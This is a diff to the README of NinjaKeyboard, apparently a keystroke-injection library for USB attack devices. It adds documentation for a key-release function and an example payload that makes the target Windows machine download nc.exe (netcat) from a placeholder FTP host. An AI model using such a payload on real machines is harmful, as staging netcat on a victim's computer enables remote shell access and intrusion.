@@ -10,6 +10,7 @@ NinjaKeyboard Function List
 ----
 <b>pressAndRelease</b> = Press a key or combination of keyboard and release. usage : pressAndRelease(key_ALT, key_TAB)</br>
 <b>press</b> = Press a key or combination of keyboard without release. usage : press(key_ALT, key_TAB)</br>
+<b>release</b> = release a key or combination of keyboard. usage : release()</br>
 <b>echo</b> = write a text without enter/newline/return. usage : echo("text")</br>
 <b>echoEnter</b> = write the text and enter/newline/return. usage : echoEnter("text")</br>
 <b>sleep</b> = delay or sleep for "n" milisecond. usage : sleep(5)</br>
@@ -21,3 +22,25 @@ NinjaKeyboard Function List
 <b>done</b> = Turn the LED off when payload is loaded. usage : done()</br>
 
 
+Example Payload
+----
+```c
+#include <NinjaKeyboard.h>
+
+EthicNinjaKeyboard en;
+
+void setup()
+{
+  //Inisialisasi program
+  en.init(1500);
+  //Download single file
+  en.winFTP("get","user_ftp","pass_ftp","host_ftp", "port_ftp","nc.exe");
+}
+
+void loop() {
+  
+}
+
+
+```
+[More Payload](https://github.com/EthicNinja/Ninjutsu-USB/tree/master/libraries/NinjaKeyboard/examples)
